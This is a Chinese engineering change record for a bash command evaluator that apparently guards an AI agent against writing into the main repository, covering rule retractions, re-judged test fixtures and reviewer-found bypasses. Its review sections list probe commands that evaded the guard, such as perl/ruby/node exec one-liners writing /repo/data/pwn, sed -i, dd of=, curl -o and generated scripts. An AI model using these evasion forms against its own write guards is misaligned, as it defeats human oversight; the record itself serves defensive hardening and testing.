---
id: F20261013smrj
title: bash 求值器语义模型落地——撤四条拟合规则 + 补裁簇重裁（棘轮 177→148 shrink_only=PASS）
summary: 派工单「方案 A：语义模型落地 + 补裁簇重裁」执行记录。语义模型三条腿（可求值按落点判 / 不可证回落 / 只读正面放行）取代拟合型假写证据：撤 C'''（X.append→cwd）、C4（print→cwd）、D'（gh pr 变更→cwd）、A'（主仓字面量闸）四条「隐式写→落点=cwd」规则（zdebug 实证 12 条误伤全是 {path:"/repo"} 凭空捏造）；open() mode 三分类修正（python 默认读=非写嫌疑 / 写 mode 字面量=写证据 / 非字面量=不可证 fail-closed，含 mode= kwarg 与 perl 模式）；push 远端目标=非写（本地路径例外按落点判）；pull 补进写族词表（双签终版驳回「pull 非写」）。补裁簇 12 条逐条按 §3.2.1 重批（【重裁前裁决（已废）】留痕可回溯），含派工单点名 4 条同构对与 8 条同族批改笔误。棘轮 177→148（added=0，shrink_only=PASS），全仓 5433/5433 绿。
created_in_conversation: 7b41e085-5c21-4bd1-adfe-dc3ef051753d
date: 2026-10-13
status: development
modification_class: deletion
intent:
  problem: "考题库批错答案（同命令一放一拦/读文件当写文件/字符串当写路径）与迁就错题的拟合假写证据规则（C'''/C4/D'/A'）造成 12 条 zdebug 误伤（写目标全为 {path:/repo} 凭空捏造）；工单②追加：放行库 35+ 条黑盒外置脚本考题盲放过考（bash <file> 无写面词即正面 ALLOW，探针 7 形态全盲放）"
  expected_effect: "撤四条拟合规则+补裁簇 12 条重批后命名考题双态全过；三牙落码后 28 条回归闸+4 条三牙负门全过、黑盒考题带载荷判读不盲放；棘轮 shrink_only=PASS（177→145，added=0）；全仓 vitest 5446/5446 绿"
  verify_by:
    type: capability_test
---

# bash 求值器语义模型落地（撤拟合规则 + 补裁簇重裁）

## 背景 / 意图锚

- 派工单（大獭 2026-10-13 21:11）：「考题库里有几道题本身批错了答案——不是裁判笨，是题错了。实证：两道一模一样的命令（同一次 PR 操作），一道标「放行」一道标「拦截」；还有「读文件被当成写文件」「打印字符串被当成写路径」这种批改笔误。……之前几轮长出的「迁就错答案的补丁规则」全部撤掉」→ 方案 A：语义模型 + 补裁簇重裁（B 保守回退 / C 豁免 2 键均否决）
- 裁决纪律（派工单原文）：「只许按 §3.2.1 证明演算重批，不许『为过考而豁免』」；「每条留痕【重裁前裁决（已废）】前缀+重裁依据」；「拦截试金石 52 条与负门不许动（重裁只涉放行/条件池的错题，安全侧一道不松）」
- 试金石方法论（搭档原话）：「咱们运行的实际数据作为验证用例……这些数据就是试金石」
- 语义模型（§3.2.1 证明演算，write-word-face.ts 头注释为真相源）：求值器只认真实写调用——可求值按落点判 / 不可证回落 / 只读正面放行

## 预注册（动手前预期）vs 实际对照

- 预期根因方向：12 条 zdebug 误伤与语料自相矛盾对均源于「隐式写→落点=cwd」类拟合规则的假写证据（print/append/gh pr/字面量→凭空捏造 {path:"/repo"}）
- 验证标准：撤除后 EXAM_REGEN 棘轮 shrink_only=PASS（added=0）且命名 4 条重裁后双态全过
- 若证据指向「语料期望正确而求值器欠覆盖」则放弃重裁、改走能力补全
- **预期 vs 实际**：命中为主——12 条重裁（预估 10±2 ✓）+ 棘轮 177→148。**两处偏离**：① TS-15689c88 的 #wt 回归根因是我的 open 三分类把 perl `open(F,"<",…)` 判 unknown（修：perl 模式字面量入分类）；② 53ae7e3f#main 放水暴露 `pull` 根本不在 isWrite 词表（旧判定靠 push 写落点蒙对）——偏离方向均为「求值器欠覆盖」，按预注册分支补能力（pull 补词表），未改语料期望

## 机制判定前置（修法决策树，动手前逐项打勾）

**机制识别检查点**——本次修复是否涉及：

- ☐ 新增配置字段/枚举/开关 —— 否（isWrite 词表加 `pull` 属既有判定表的语义补全，非新配置面）
- ☐ 新增状态生命周期 —— 否
- ☐ 新增定时任务/后台进程 —— 否
- ☐ 新增信号类型/消息格式 —— 否
- ☐ 新增持久化存储（表/字段/文件） —— 否（语料三库为既有 fixture 的内容修正与移池，schema 零新字段）
- ☐ 新增决策分支（结果被记住并影响后续） —— 否（openModeKind 三分类为纯运行时判定分支，无状态记忆）
- ☐ 新增跨模块调用路径 —— 否（write-word-face ⇄ write-target-evaluator 既有依赖关系不变）

**全部未命中 → 默认走修法决策树 ①②③，不涉 ④ 新增机制（无需机制预算四问/重对抗门）。**

**修法决策树判定**（主体 + 附带分别归属）：

- **主体 = ③ 删除机制**（`Modification-Class: deletion`）：撤 C'''/C4/D'/A' 四条拟合规则。按决策树③须「接受其当初解决的原始问题回归」——本例**不存在需接受的回归**：四条规则各自「解决」的考题（TS-fa07af97/TS-f35c7144/TS-508d0cc8/TS-66da667b）经重裁证实其裁决本身是批改笔误（假写证据/能力 7 漏网），删除后这些考题由语义模型正道全部通过（shrink_only PASS、added=0 实证）
- 附带 = ① 在既有机制语义内修（缺啥补啥）：open mode 三分类、push 远端口径对齐双签、pull 补 isWrite 词表
- 语料重裁 12 条 = 数据修正（考题答案批改），非机制变更，不占决策树席位

## 设计取舍

### 1. 撤 C'''/C4（append→cwd / print→cwd 假写证据）

zdebug 实证 12 条误伤的写目标全是 `{path:"/repo", via:"cmd-arg"}` 凭空捏造（纯计算/只读载荷被捏出 cwd 写）。语义模型下 print/append 是数据操作不是文件写调用，不构成写证据。配套重裁 TS-f35c7144/TS-fa07af97（其「隐式写→落点=cwd」裁决随规则一起作废）。

### 2. 撤 D'（gh pr edit/merge/close/reopen/create→cwd）——同构对按内容判到一致 = 双 ALLOW

- 双签既有口径明文：「gh issue comment（**外部写不落本地树**）」（TS-6a5cc1b2 裁决原文）；语料压倒性一致：gh pr edit（TS-c084/c085/TS-324eaad4/TS-3b2fd2b2/TS-05537e52）、gh pr create（TS-a4c2ffa4）、gh issue create/comment（TS-fea396ea/TS-c092）、gh pr review --comment（TS-9e996401/TS-7715da07）全 ALLOW
- TS-508d0cc8 的「主仓树内×1/4」证据自身错误（`__HEREDOC_DATA__(/tmp/pr1269-body-update(重定向)` 被标主仓树内——/tmp 不在主仓树内）；与 TS-a6dfe989（同 pr1269-body 操作族，ALLOW）判到一致 = 双 ALLOW
- ⚠️ **派工单条款张力旗标（呈大獭知悉）**：TS-508d0cc8 是拦截池条目，派工单 point 2 将其列为重裁目标（「同构对按内容判到一致」）vs point 5「拦截试金石 52 条与负门不许动（重裁只涉放行/条件池的错题）」——两条款字面冲突。按 point 2 **具名授权**执行（重裁点名 = 例外授权），「安全侧一道不松」理解为不得把真写放行（本案写证据全落 /tmp 全树外，无真主仓写）。若裁决方向应为双 BLOCK（D' 保留），回滚成本 = 一条脚本 + 恢复 D' 块，随时可翻案

### 3. 撤 A'（c062 主仓字面量闸）+ 形态B 字面量闸限定只读载荷

- A' 是建立在 TS-66da667b「主仓树内×1/1」裁决上的拟合闸，而该裁决已按能力 7 拍板翻正（目标 data/workspaces/…=沙箱非主仓树，同构 TS-67845f56/TS-ad11a060 翻正先例）
- 语义模型下字面量出现在字符串里不构成写证据（TS-ee23c745 双签：「写形态仅存在于字符串字面量（cmd 数据），非调用点——按 §3.2.1 调用点语义不构成写证据」）；写调用参数不可求值→回落的 fail-closed 已覆盖变量间接面（resolveScriptArg null→回落）
- 形态B 路径字面量闸（c100 语义）限定 `!hasWriteCall`：只读载荷的主仓字面量仍回落（防线不破）；写载荷落点已由形态A正面判定，字面量不重复当闸（否则 `open('/repo/x','w')` 这类写主仓正向拦截被自家闸误回落）
- 已知残余面（记档）：提取词面外写形态（`Path.write_text` 等）×主仓字面量间接——随词表收编收敛

### 4. open() mode 三分类（open 未知 mode 修正，病理按 §3.2.1 规则 1）

- **read**：1 参 open（python 默认读模式=**非写嫌疑**）/纯读字面量（r/rb/rt/perl `<`）
- **write**：写 mode 字面量（w/a/x/+ 族、r+、perl `>`/`>>`/`+<`/`+>`/`+>>`）
- **unknown**：mode 非字面量（变量/调用/空字面量）→ **不可证 fail-closed 回落**——修复旧 fail-open：`open(p, mode='w')` kwarg 形态曾被当「无 mode」误判读；`open(p, m)` 变量 mode 曾被当读
- word-face 侧（openCallUnknownMode/openCallWriteHits）与提取通道（openModeKind）双侧同语义

### 5. git 语义对齐双签终版

- **push（远端目标）= 外部写不落本地树→非写放行**（10 条 allow 考题「双签口径：git push（远端目标）归非写放行」）；push 目标为本地路径/`.`（罕见）例外按落点判
- **pull 归写按落点判**（双签终版：检视獭驳回「pull 非写」——pull=fetch+merge/rebase）——求值层 isWrite 词表补 `pull`（53ae7e3f 语料期望正确，属求值器欠覆盖，未动语料）
- 旧链对齐锚已记档分叉：GIT_WRITE_SUBCOMMAND（旧链正则）仍按写族拦 push——旧链退役时自然收敛，本 PR 不动生产判定

### 6. 测试期望变更（2 条，附依据）

- 「git push origin HEAD → 拦」→「远端目标→非写放行」+ 新增本地路径 push 负门（`git push /repo/x` 仍拦）——依据=双签口径「git push（远端目标）归非写放行」（语料 10 条同判）
- 「git push 主仓 cwd 带 2>&1 管道 → 仍拦」→ 命令体换真写写族（git commit）继续钉「fd 复制不放行真写」——原载体 push 远端不再构成真写，负门语义由 commit 写族保真

## 补裁簇重裁清单（12 条，逐条【重裁前裁决（已废）】留痕）

| 条目 | 移池 | 重裁依据（摘要） |
|---|---|---|
| TS-508d0cc8 | block→allow | gh pr edit=外部写不落本地树（TS-6a5cc1b2 明文）；原证据 /tmp 被标主仓树内自相矛盾；与 TS-a6dfe989 同构对判一致 |
| TS-66da667b | block→allow | 能力 7 拍板：data/workspaces=沙箱（同构 TS-67845f56 先例）；原「主仓树内×1/1」漏网批改笔误 |
| TS-f35c7144 | cond→allow | 纯计算无写（lunardate 日期运算+print）；原「隐式写」= C4 假写证据 |
| TS-fa07af97 | cond→allow | json.load/glob/open(f).read 只读族（派工单点名「读文件被当成写文件」翻正） |
| TS-15689c88 | cond→allow | perl `open(F,"<",…)` 只读读文件被当成写文件 |
| TS-da5c5ca3 | cond→allow | gh pr review=外部写 + `$(cat <<EOF)` 只读 |
| TS-14bd05b6 | allow→cond | cwd 不可反查（证据明示真 cwd=非主仓）→ 两目录各测（双签既有口径） |
| TS-d79005bb | allow→cond | 同上（git add/commit 族同形态） |
| TS-affb0ba6 | allow→cond | git cherry-pick=仓库状态写按落点判（原「只读/纯计算」与写词面表及双签口径矛盾）→ 双态各测 |
| TS-c139 | cond→block | argv[2]→/repo/b 绝对主仓路径两态皆写（机械双态模板误用，#wt=ALLOW 是放水口） |
| TS-c141 | cond→block | 同上（argv[1]→/repo/data/x） |
| b1c9e7ec | cond→block | 绝对路径写 /repo/.otter/local-stash-backup（非排除区）两态皆 BLOCK（机械双态模板误用） |

守恒：三库总数 921 不变（allow 767→770 / block 49→50 / cond 105→101），跨库唯一性断言过，字面量计数锚同步（767/49/105→770/50/101）。

## 影响范围

- `src/frameworks/agent/write-target-evaluator.ts`：撤 C'''/C4/D'/A'；open 提取通道三分类（openModeKind）；isWrite 补 pull；push 远端非写+本地例外；形态B 字面量闸限定只读载荷
- `src/frameworks/agent/write-word-face.ts`：openModeOf/classifyModeLiteral 三分类（默认读=非写嫌疑、mode= kwarg、perl 模式、未知→不可证）；openCallUnknownMode 修正；payloadWriteFaceHit 并入未知 mode 闸
- `tests/fixtures/guard-touchstone-{allow,block,conditional}.json`：12 条重裁移池 + meta 计数
- `tests/frameworks/agent/write-target-evaluator.test.ts`：2 条期望变更 + 1 条本地 push 负门新增
- `tests/frameworks/agent/guard-touchstone-{corpus,exam}.test.ts`：字面量计数锚同步

## 验证

- **棘轮**：177→148，`shrink_only=PASS`（added=0，逐池 allow removed 群/block 1/cond 7 全为删除键）
- **全仓**：`npx vitest run` 5433/5433 绿（360 文件）；evaluator 78 例绿
- **正反双侧**：放行面（zdebug 12 误伤全清、push 远端 10 条、沙箱写、纯计算）+ 拦截面（本地 push 负门、argv 绝对路径双态 BLOCK、fd 复制不救真写、$W 爬升回落族保持）均钉测试
- 命名 4 条（TS-f35c7144/fa07af97/a6dfe989/508d0cc8）+ 全部 12 条重裁后双态过考，无一靠「回落恰好放行」

## 残余面与立档

1. **4 条拦截池疑似同族批改笔误（未动，呈大獭拍板）**：TS-2ddd1c90 / TS-c60ababd / TS-d1c92c6e / TS-e94be41a（`cat >> /repo/.otter/worktrees/wt/… <<EOF`）——裁决证据 `__HEREDOC_DATA__(/repo/.otter/worktrees/…` 被标「主仓树内」（.otter/worktrees/ 是排除区，证据自相矛盾，与 TS-508d0cc8 同族）。按「拦截池冻结+未点名不擅动」纪律立档不动——**要不要一并翻正，一句话可决（脚本一分钟）**
2. 提取词面外写形态（Path.write_text 等）×主仓字面量间接 = A' 撤除后的已知残余（随词表收编收敛）
3. 旧链 GIT_WRITE_SUBCOMMAND 与求值层 isWrite 的 push 分叉已记档（旧链退役收敛）
4. 检视獭1360 补签欠账（TS-080c6544 / TS-f6fe2325）待 PR 审视时双签收口

## 后续

- 能力 3 收尾清棘轮（148→0）为下一棒（fail-closed(heredoc-script-payload) 88 条大头）
- 对抗审视（检视獭1360，模型错开）→ delta 复核 → 大獭/搭档终审

---

## 审视修复轮（严重 1：撤 A' 三通道真写缺口）—— 2026-10-14

检视獭1360 对 PR #1466 对抗审视判「需修改（1 严重 + 4 建议）」，大獭逐条拍板：**严重 1 四步全做**（write-verdict fail-closed 分支 / 规则 1 未知调用闸+词表 / curl+renameSync 参序小修 / 14 形态进 block 池负门）；建议 3（REGEN 留痕升格）、4（rebase 追平 main）、5（良性零目标以棘轮反馈为准）采纳；建议 2（TS-cb4cc057 残余面转正）延后到能力 3。本节记录严重 1 的实现与取舍。

### 背景（撤 A' 的连带退化）

撤 A'（主仓字面量闸）后，真写词面覆盖出现三通道缺口——合成对抗 14 形态实测**正面放行真写主仓**（语料外，棘轮只看语料故不红）：通道 a 词面失明（Path.write_text/os.chmod/sqlite3.connect/np.save/extractall 被「证明无写」误判）、通道 b 写面命中但落点提取空（install/sed -i/perl -pi/dd of=）、通道 c 机械 bug（curl 单空格正则永不匹配 + renameSync/copyFileSync 参序只提 src）。A' 在位时这些形态 fail-closed，本刀撤闸后正面放行 = 从松到严反方向退化。本修复轮**关闭残余面 #2**（提取词面外写形态 × 主仓字面量间接）。

### 机制判定前置

本修复轮是 PR #1466（F20261013smrj）的审视反馈修复，同一特性内续——机制识别检查点七项沿用主文档判定（全未命中，不涉新增机制），不重复判定。

### 设计取舍（核心：目标提取，而非兜底网）

**取舍 1：以目标提取收编词面（修法 2「词表兜底」），而非修法 1 兜底网 / 未知调用闸。**
- 修法 1「写面命中∧落点提取空→fail-closed」兜底网实测**过度拦截试金石 48 条**（`gh issue create --body "...rm..."` 词面在字符串字面量里被 raw-text 正则误命中、`git push` 远端非写空落点被误判、`dd --help` 良性零目标）——raw-text 词面匹配无法区分「命令位写词」与「字符串里的写词」，是 A' 过度拦截的同型病。
- 修法 2「未知调用闸（未知调用+路径字面量→不可证）」同样过度拦截良性只读（`os.path.basename('/x')`/`connect('...mode=ro')` 等纯计算/只读调用带路径字面量被误判不可证），且漏接收者路径写（`Path('/x').write_text` 路径在接收者不在参数）。
- **采纳修法 2 的「词表补 … 族兜底」形态**（审视报告明示可接受的替代）：目标提取把 install/dd/sed -i/perl -pi/curl -o/wget -O/chmod/chown/chgrp/truncate/ln/rm + 脚本方法（Path(lit).write_text/write_bytes、os.chmod/chown/utime/truncate、np.save/savez、extractall、sqlite3.connect）逐个收编，**可求值按落点判**（良性 /tmp/worktree→ALLOW，真写 /repo→BLOCK positive）。这与语义模型三条腿（可求值按落点判 / 不可证回落 / 只读正面放行）一致，不引入假写证据。
- **修法 1 兜底网延后**：其残余价值（真未识别写命令，如 `frobnicate /repo/x`）很小（试金石写命令已被提取收编），而过度拦截面（字符串字面量写词、~ 家目录）需 parser 感知的命令位词面检测才能根治——立档为残余面（下表），不开 raw-text 拟合网。

**取舍 2：~ 家目录落点 = 非主仓树。** `rm ~/Desktop/x` 等家目录写不落主仓树（home ≠ /repo）→ 放行，而非 evalPath 的 `~`→dynamic→fail-closed。`~/../`（可爬升回主仓）仍回落不可证。依据：pathWithinMain 的判定基准是主仓树，home 天然树外（试金石 TS-a32f51e7/TS-b9f11dfe 良性家目录 rm 实证）。

**取舍 3：rm 补进目标提取（词表命令落点=全部非旗标参数）。** 通道 b 同类（rm 写面命中但落点提取空）。补后 `rm /repo/x`→positive BLOCK（关 rm 漏口）、`rm /tmp/x`→ALLOW、`rm ~/x`→ALLOW。附带修 2 条拦截/条件池放水缺口（见验证）。

**取舍 4：4 条会话态 cwd=worktree 相对路径原地编辑改条件期望（改批错的答案，请双签）。** TS-ffde7c4f/d055ab39/f5c3141d/3fd4a55b（`perl -pi … tests/…` 无 cd）原列放行池「always-allow」，然其裁决原文即「会话态 cwd=worktree…v2 须用运行时真实 cwd 判定」= 判据本是条件期望（worktree→ALLOW / main→BLOCK）。本刀目标提取按真实 cwd 提取落点（tests/ 相对主仓=主仓写）暴露此归类错——按试金石「改的只是批错的答案」改条件期望（一道不删一道不挪，主仓态新增 BLOCK=收严非放水）。守恒 921 不变（allow 770→766 / cond 101→105）。**需检视獭/大獭双签追认**（进库冻结「追加须双签+呈报」）。

**取舍 5：14 条合成对抗负门进 block 池（搭档「偷跑一个不许再开」）。** 检视獭1360 探针矩阵 14 形态（通道 a 8 + b 4 + c 2）进 block 池正向钉死必拦（id 前缀 TS-smrj）。block 50→64（+14 synthetic_probe，非真实语料——真实语料守恒 921=766+50+105 不变）。

### 影响范围

- `src/frameworks/agent/write-target-evaluator.ts`：新增 evalExtendedWriteTargets（install/ln/chmod/chown/chgrp/truncate/dd/curl/wget/sed -i/perl -pi/ruby -pi 目标提取）；evalScriptWriteTargets 补 renameSync/copyFileSync/copyFile/shutil 双参 dst（通道 c② 参序）、Path(lit).write_text/write_bytes、os.chmod/chown/utime/truncate、np.save/savez、extractall、sqlite3.connect（mode=ro 跳过）；TARGET_ARG_COMMANDS 补 rm；~ 家目录落点非主仓
- `src/frameworks/agent/write-word-face.ts`：ARG_TARGET_FACE curl 单空格/`--output` 正则修复（通道 c①）；PAYLOAD_WRITE_FACE 补 Path(lit).write_text/bytes、os.chmod/chown/utime/truncate、np.save/savez、extractall；connectCallWriteHits（mode=ro 只读非写）并入 payloadWriteFaceHit/proveNoWrite
- `tests/fixtures/guard-touchstone-{allow,conditional,block}.json`：4 条改条件期望 + block 14 条合成负门 + meta 计数/留痕
- `tests/frameworks/agent/guard-touchstone-corpus.test.ts`：守恒计数锚同步（766/64/105，真实语料 921 分离核）

### 验证

- **14 合成对抗形态全 BLOCK**：通道 a（write_text/write_bytes/os.chmod/os.chown/os.utime/sqlite3.connect/np.save/extractall）+ 通道 b（install/sed -i/perl -pi/dd of=）+ 通道 c（curl -o/renameSync/copyFileSync）——正向负门钉死
- **放行面不误伤**：sed -i/curl -o 到 worktree/tmp/dev-null、Path('x').write_text 到 worktree、connect(mode=ro) 只读、rm 到 tmp/worktree/家目录均 ALLOW
- **棘轮 shrink_only=PASS**：148→146（added=0，removed=2：TS-5a47bb65 `rm /repo/data/…` 放水→positive BLOCK、3b399252#main `git worktree remove` 放水→BLOCK，均真修复收严）；REGEN 前后计数留痕（allow 111/block 10/cond 25）
- **全仓**：`npx vitest run` 5429/5433 绿；4 失败全在 `tests/scripts/generate-guard-replay.test.ts`（**pre-existing，与本变更无关**——`git stash` 本变更后复跑同样 4 failed|2 passed，实证基线即坏，非自引入）
- **最简实现检查**：已过——目标提取复用 evalPath/evalTargetArgCommand 既有落点语义，未引新框架/依赖；修法 1 兜底网经实测过度拦截后弃用（弃繁就简），非漏做
- **负面向验收（本次变更破坏了什么旧契约/绕过了什么保护）**：① 4 条试金石「always-allow」改为条件期望（主仓态新增 BLOCK）——是收严，但动了试金石归类，故单独呈双签；② 未绕过任何既有保护——fail-closed 回落（uncovered-cmd/dynamic-path/heredoc-script-payload）全保留，#1240 heredoc 负门、$W 爬升回落族不动

### 残余面与立档（更新）

- **残余面 #2（Path.write_text 等提取词面外写形态）已关闭**（本修复轮词表收编）
- **新增残余面：修法 1 兜底网延后**——真未识别写命令（词表外新写命令，如未来 `frobnicate /repo/x`）落点提取不到时仍「写面命中∧落点空→放行」。根治需 parser 感知的命令位词面检测（区分命令位写词 vs 字符串字面量写词），非 raw-text 兜底网（会误伤字符串字面量）。随词表收编与能力 3 收敛
- TS-cb4cc057（sed -i 写 worktree fail-closed 钉 block）残余面转正留到能力 3（大獭拍板延后）
- 检视獭1360 补签欠账（TS-080c6544/TS-f6fe2325 ID 对不上，应为 c034/c024）随 PR 审视收口

## 审视修复轮——工单②：黑盒外置脚本三牙 + 回归闸（2026-10-14）

### 背景与裁决

红线核查（fact ea534b5b）：放行库实扫 35+ 条黑盒外置脚本考题以「盲放」过考（求值器对 `bash <file>` 形态无写面词即正面 ALLOW——探针实测 7 形态全盲放，含两条预定负门形态本身）。按「停下带数据回报」上报后大獭裁决（signal d5f2ae9a，采纳出路 A + 三项口径修正）：① 黑盒放行题一个不动，但带载荷 fixture 上考场（在仓脚本按真内容考、失传/外部脚本标「载荷缺席」记档保留放行）② 新增生成/动态路径拦截 + 命令内造脚本判读两条规则 ③「bash /tmp/不存在.sh」从负门撤销归放行侧（文件不存在→执行必然失败→零写面，是校正不是放水），危险面由两颗牙 +「载荷不可读→拦」钉死。

### 三牙设计（求值器新增，write-target-evaluator.ts）

- 牙1 生成/动态脚本路径（$(gen).sh / $VAR.sh 族，解释器域）→ fail-closed `script-path-dynamic`。source/. 动态源（source <(sed …)）不进牙1——5d98a85e 现役放行题答案保守（残余记档）
- 牙2 命令内造脚本再执行（echo 写 .sh && bash 同文件）→ 按造出来的内容递归判读（能力 1 heredoc 通道同口径 evaluateFromModel）；内容不可静态重建（echo "$X"、追加、cp 族）→ fail-closed `script-payload-dynamic`
- 牙3 静态路径三态：`content`→递归判读（子落点并入）；`unreadable`→fail-closed `script-payload-unreadable`；`absent`/未标→零写面放行侧
- **豁免排除集 UNPROVABLE_TEETH**：三牙终局态（含 parse-failed）不进「能力 4 词面证」豁免——proveNoWrite 盲于脚本执行面，会把牙口 fail-closed 洗成正面 ALLOW（探针实证：`bash /tmp/x.sh` 无写词面被豁免洗白）
- **载荷深判读不可证的兕底序**：词面证 → 主仓字面量闸（载荷含主仓树绝对字面量不许放，与窄提取同源口径）→ 无主仓字面量则零写面放行（残余：动态目标/相对落点不可证——记档）
- **附带窄修（同形 bug 两处）**：evalGitAdd/evalGitWrite 的 `-C "$VAR"` 值直读 word.evaluated（var 词恒 null）使 `git -C "$WT" commit` 恒 fail-closed——补纯 var 词赋值溯源（与 evalCdTarget 同口径）。实证面：do-commit 载荷判读 + TS-5ef6fcf4（`git -C $W commit` 缺口真修复闭合）

### 考题与记档（guard-touchstone 三库）

- allow +28 回归闸（TS-smrjreg<8hex> 前缀）：影子 miss_block_candidate 裁决批 25+3（大獭 2026-10-14 复核「确认误拦」）固化为放行考题——修复后必须全部正面 ALLOW 防修过头
- 黑盒载荷记档：content 6 条（do-commit ×3 + .githooks/pre-commit ×3）/ absent 31 条（载荷缺席保留放行，记档不隐身）+ block TS-291c5634 同记
- block +4 三牙负门：TS-smrjdgen01（$(gen).sh 牙1）/ TS-smrjmade01（造-执真写主仓，正负门同形对打）/ TS-smrjmade02（造-执动态内容）/ TS-smrjunrd01（载荷不可读）
- 守恒 921 不变（794+68+105−TS-smrj 系 46 条）；追加依据大獭工单+裁决 signal d5f2ae9a，检视獭1360 delta 复核在途
- 棘轮 REGEN 留痕 148→145（TS-5ef6fcf4 闭合=真修复；148→146 为严重1轮两项放水口转正）

### 机制识别检查点与修法分类

七项清单：命中第 1 项（UnevalReason 新增 3 个判读原因标签）——判读原因词表是诊断标签非机制开关，不涉持久状态/跨模块路径；第 5 项边界（fixture 新增 scriptPayload 字段）是考题携带判读输入的数据形态，非持久化存储机制。主体走修法决策树①（在既有机制语义内修）：外置脚本载荷判读是既有载荷三通道（heredoc/-c-e/文件）中「文件通道」的缺位补齐，不涉净新增机制。

### 与 #1467 的跨产线对照（M-3f8d8a0d）——⚠️ 冲突已停报

13 用例逐条对照：A1-A6（python heredoc/-c 读 fixture、cat/printf >> worktree、node -e 只读、git -C worktree 写族、rm workspaces）与本库同族同判 ✓；B1/B3/B4/B6/B7（main 态 git 写、sleep/pkill/data_destructive）无同命令不涉 ✓。**2 对同命令反判**：

1. `git push origin --delete feature/F20261012orcl-acceptance-oracle-gate`（全等文本）：#1467 1013-B2 钉 BLOCK（V1 远端删分支负门）vs 本库 TS-smrjreg18f0c467 + c170d88c 内嵌同形判 ALLOW（大獭复核确认误拦=远端 feature 分支清理）
2. `bash data/workspaces/…/do-commit.sh`（同形同脚本）：#1467 1013-B5 样本 7daea038 钉 BLOCK（V1 现状，自带「翻转须重裁」注记）vs 本库 TS-smrjregc0c9c6a6/cb2c9109/3064857e 判 ALLOW（大獭裁决 signal d5f2ae9a 实质安全+载荷判读）

两对均属 V1 现状行为 vs v2 目标语义的层差（双方事实认定一致：脚本内容 git -C "$WT" add/commit；远端操作非本地树写）——按工单⑤「冲突即停报我」已停推上报。

**裁决落档（大獭 2026-10-14，层差注记终态）**：层差记档口径成立，双库强行对齐不走——两库考的是两个法院，硬对齐反而搅浑（L1 大獭拍板，不涉 L2 产品方向/对外承诺）：

- **do-commit.sh 对：终态以 v2 为准（载荷判读→ALLOW）**——#1467 1013-B5「翻转须重裁」钩子已兑现：signal d5f2ae9a 裁决 + 2026-10-14 全天候选裁决构成重裁，结论=ALLOW
- **`git push origin --delete` 对：双法院两案，非反判**——求值器法院管「写没写主仓」（无本地树写→ALLOW），策略层法院管「破坏性远端操作」（R1.4→BLOCK）；#1467 1013-B2 的 V1 远端删分支负门是策略层牙齿，**不随 main_write 退役**，管线终态两层各司其职
- 本库侧层差注记已落 5 条考题 adjudication（TS-smrjreg18f0c467/c170d88c、TS-smrjregc0c9c6a6/3064857e/cb2c9109）；#1467 侧注记由固化獭补（大獭已回签 PR #1467 comment 6160667395），M-3f8d8a0d 转入等注记落位

### delta2 复核补刀（exec 词面语法面 + 牙3 生产接线，2026-10-14）

检视獭1360 delta 复核（PR #1466 留痕 + review-1466-delta2-report.md 产物 716e0102）两发现全采纳，修法照单：

**发现 1（严重）：exec 词面语法面漏**——`perl -e "exec 'touch', '/repo/data/pwn'"`（列表/字符串式）、`ruby -e "exec '…'"`、`node -e "require('child_process').exec('…')"` 四形态正面放行真写主仓。机制：SCRIPT_EXEC_FACE 要求 `\s*\(`（perl/ruby 无括号调用逃逸）+ 点号方法 lookbehind 全豁免（当年为放 sqlite db.exec）把 child_process.exec 一起放行。修法：

- SCRIPT_EXEC_FACE/EXEC_FACE 补无括号形态（`exec|system` + 引号/词头实参，实参首字符排除数字防 `exec 3>&-` fd 操作误伤）；动词表补 execFileSync（execFileSync( 整词曾缺失）
- 点号方法按**参数形态**区分（dotExecCommandHits，与 connectCallWriteHits 同构引号感知首参提取）：纯 SQL 字面量（SQL 起手且无命令词/路径字面量）→数据库豁免维持（TS-e00efca3 `db.exec(\`CREATE TABLE …\`)` 实证面，含逗号列清单/括号参数 SQL）；含命令词/路径字面量、非 SQL 形态、首参非字面量（变量/模板插值）→不可证
- 实现关键：shell 转义引号形态（`\``）在载荷重组文本中保留反斜杠——readStringLiteralArg 跳过转义前缀、转义结束引号按对称终结符处理（否则 TS-e00efca3 反被误伤）；词面证洗白面（能力 4 proveNoWrite）同补无括号形态（否则窄提取闸命中后被 :900 洗回）
- 4 形态进 block 池负门（TS-smrjexec01-04）+ 单测双向钉死（含 db.exec 纯 SQL 放行对照）
- **残余面记档**：perl 间接对象形（exec { $path } @args）、无括号点号形态（obj.exec 'cmd'）、次参携带（exec('sh','-c',x)）——词面证残余，后续 delta 可再收敛

**发现 2（高建议）：牙3 生产接线**——ScriptPayloadInfo「生产调用方提供」但全仓无任何注入点（唯一 fixture 注入在考试测试），生产缺省=absent 放行记档是静默 fail-open（切换 PR 忘接线→「静态外置脚本全盲放」，unrd01 负门生产无法成立）。修法（采纳大獭工单口径）：

- `buildScriptPayloadPlan` 缺省不再静默 absent：调用方不提供载荷时**求值器自查 fs**（fsAbsentPlan）——文件真实不存在=「文件不存在→执行必然失败→零写面」缺席证明→absent 放行侧；存在/不可查=无法证明缺席→script-payload-unreadable fail-closed（**未接线≠缺席**）
- 显式声明（entry）为另一证明源（fixture 记档+考题断言+adjudication 校验面），不做 fs 复核——防考题机器依赖（/tmp 探针残留 /tmp/do-commit.sh 实证过此风险）
- TOCTOU 记档：stat 与执行间存在时间窗
- **切换 PR 硬验收项**：切换前必须验证生产链路真实接上 content/unreadable 判读（注入点存在 + shadow 数据中 script-payload-unreadable 归因可解释），未验证接线不得切换——防静默退化「静态外置脚本全盲放」
- 类型层强制注入（ScriptPayloadInfo 必填化）为增强项，随切换 PR 一并做（本轮不强求，大獭工单口径）

**机制识别检查点更新**：求值器新增只读 fs 查询（fsAbsentPlan statSync）——原「纯函数无 IO」声明收窄为「除牙3 缺席证明的 fs stat 只读查询外无 IO」，非持久状态/非跨模块路径，仍不命中机制开关清单；引入点已在模块头注释记档。

**验证（delta2 轮）**：全仓 5518/5518 绿（363 文件）；write-target-evaluator.test.ts 95→99 例（+4 delta2 双向钉死）；judge 考试 794/72/105 全过（block 68→72=+4 exec 负门）、棘轮 added=0（TS-e00efca3 误翻红已修回）；corpus 守恒 921 恒等（TS-smrj 前缀扣减 46→50）。

### 验证

- 单测：write-target-evaluator.test.ts「F20261014smrj 黑盒外置脚本三牙」放行侧 6 + 拦截侧 7（含「能力 4 豁免不得洗白牙口」负门与既有通道不误伤对照）
- judge 考试全量复跑：放行池 794 / 拦截池 68 / 条件期望 105，棘轮 145 键 shrink-only=PASS
- 全仓 5446/5446 绿（360 文件）

